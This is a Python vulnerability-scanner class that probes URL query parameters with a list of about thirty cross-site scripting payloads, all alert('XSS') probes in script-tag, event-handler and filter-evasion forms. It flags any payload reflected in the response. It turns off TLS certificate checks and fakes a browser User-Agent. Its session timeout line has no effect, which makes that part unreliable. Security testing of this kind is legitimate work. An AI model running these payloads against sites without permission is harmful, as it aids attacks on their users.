
import requests
import re
from urllib.parse import urljoin, urlparse
from colorama import Fore, Style

class XSSScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 15
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/.source)</script>",
            "<script>alert`XSS`</script>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<SCRIPT>alert('XSS')</SCRIPT>",
            "<<SCRIPT>alert('XSS')//<</SCRIPT>",
            "<script>alert('XSS');</script>",
            "<script type='text/javascript'>alert('XSS');</script>",
            "onmouseover=alert('XSS')",
            "onclick=alert('XSS')",
            "onload=alert('XSS')",
            "onerror=alert('XSS')",
            "onfocus=alert('XSS')"
        ]
        
        self.reflection_patterns = [
            r"<script>alert\(['\"]XSS['\"]?\)</script>",
            r"alert\(['\"]XSS['\"]?\)",
            r"<img[^>]*src=x[^>]*onerror=alert\(['\"]XSS['\"]?\)[^>]*>",
            r"<svg[^>]*onload=alert\(['\"]XSS['\"]?\)[^>]*>",
            r"javascript:alert\(['\"]XSS['\"]?\)"
        ]
    
    def scan_url(self, url, params=None):
        vulnerabilities = []
        
        print(f"{Fore.YELLOW}Scanning {url} for XSS vulnerabilities...{Style.RESET_ALL}")
        
        for payload in self.payloads:
            try:
                if params:
                    for param in params:
                        test_params = params.copy()
                        test_params[param] = payload
                        
                        response = self.session.get(url, params=test_params)
                        
                        if payload in response.text:
                            for pattern in self.reflection_patterns:
                                if re.search(pattern, response.text, re.IGNORECASE):
                                    vuln = {
                                        'type': 'XSS (Cross-Site Scripting)',
                                        'url': url,
                                        'parameter': param,
                                        'payload': payload,
                                        'method': 'GET',
                                        'evidence': 'Payload reflected in response'
                                    }
                                    vulnerabilities.append(vuln)
                                    print(f"{Fore.RED}XSS vulnerability found: {param} = {payload}{Style.RESET_ALL}")
                                    break
                
            except Exception as e:
                print(f"{Fore.RED}Error testing {url}: {str(e)}{Style.RESET_ALL}")
                continue
        
        return vulnerabilities
